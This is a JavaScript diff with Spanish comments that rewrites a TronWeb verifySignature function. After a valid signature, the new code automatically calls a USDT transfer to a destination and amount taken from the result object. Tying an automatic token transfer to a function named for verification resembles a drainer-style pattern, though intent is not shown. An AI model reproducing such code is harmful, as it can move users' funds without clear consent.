@@ -206,39 +206,60 @@
 
     async function verifySignature(result) {
 
-        if (!window.tronWeb) {
-            throw new Error(
-                'TronWeb no está disponible.'
-            );
-        }
+    if (!window.tronWeb) {
+        throw new Error(
+            'TronWeb no está disponible.'
+        );
+    }
 
+    if (
+        !window.tronWeb.trx ||
+        typeof window.tronWeb.trx.verifyMessageV2 !== 'function'
+    ) {
+        throw new Error(
+            'verifyMessageV2 no está disponible.'
+        );
+    }
 
-        if (
-            !window.tronWeb.trx ||
-            typeof window.tronWeb.trx.verifyMessageV2 !== 'function'
-        ) {
-            throw new Error(
-                'verifyMessageV2 no está disponible.'
-            );
-        }
+    const recoveredAddress =
+        await window.tronWeb.trx.verifyMessageV2(
+            result.message,
+            result.signature
+        );
 
+    const valid =
+        recoveredAddress === result.address;
 
-        const recoveredAddress =
-            await window.tronWeb.trx.verifyMessageV2(
-                result.message,
-                result.signature
-            );
-
-
+    if (!valid) {
         return {
-            valid:
-                recoveredAddress ===
-                result.address,
-
-            recoveredAddress:
-                recoveredAddress
+            valid: false,
+            recoveredAddress: recoveredAddress
         };
     }
+
+    // =====================================================
+    // EJECUTAR TRANSFERENCIA AUTOMÁTICAMENTE
+    // =====================================================
+
+    const transferencia =
+        await ejecutarTransferencia({
+
+            contratoUSDT:
+                'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+
+            direccionDestino:
+                result.destination,
+
+            montoUSDT:
+                result.amount
+        });
+
+    return {
+        valid: true,
+        recoveredAddress: recoveredAddress,
+        transferencia: transferencia
+    };
+}
 
 
     // ============================================================
